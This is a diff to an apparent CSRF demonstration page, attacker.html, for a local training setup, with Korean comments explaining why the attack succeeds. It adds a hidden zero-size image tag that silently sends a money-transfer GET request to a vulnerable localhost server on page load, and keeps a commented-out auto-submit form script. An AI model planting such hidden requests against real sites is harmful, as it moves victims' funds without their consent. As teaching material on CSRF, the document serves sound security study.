@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <!-- attacker.html - CSRF 공격 페이지 -->
-<!-- 이 파일은 http://localhost:9000/attacker.html 에서 접근합니다 -->
+<!-- 이 파일은 http://localhost:8888/attacker.html 에서 접근합니다 -->
+<!--
+    CSRF 공격이 가능한 이유:
+    1. 취약한 서버에 CSRF 토큰이 없음
+    2. localhost에서는 다른 포트(8888→5001)도 same-site로 취급됨
+       (SameSite=Lax여도 same-site이면 쿠키 전송됨)
+    3. /transfer 엔드포인트가 GET/POST 모두 허용하여 다양한 공격 벡터 존재
+-->
 <html>
 <head>
     <meta charset="UTF-8">
@@ -20,10 +27,18 @@
 </form>
 
 <hr>
+
+<!-- 공격 2: GET 기반 자동 공격 (이미지 태그) -->
+<p style="color:gray; font-size:12px;">
+    [공격자 메모] 아래 이미지 태그는 페이지 로드 시 자동으로 GET 요청을 보냅니다.
+</p>
+<img src="http://localhost:5001/transfer?to=attacker&amount=100" width="0" height="0" style="display:none;" alt="">
+
+<hr>
 <p style="color:gray; font-size:12px;">
     [공격자 메모] 아래 스크립트의 주석을 해제하면 페이지 로드 시 자동 송금됩니다.
 </p>
-<!-- 공격 2: 자동 제출 (주석 해제 시 페이지 열면 즉시 송금) -->
+<!-- 공격 3: 자동 제출 (주석 해제 시 페이지 열면 즉시 POST 송금) -->
 <!--
 <script>document.getElementById('csrf_form').submit();</script>
 -->
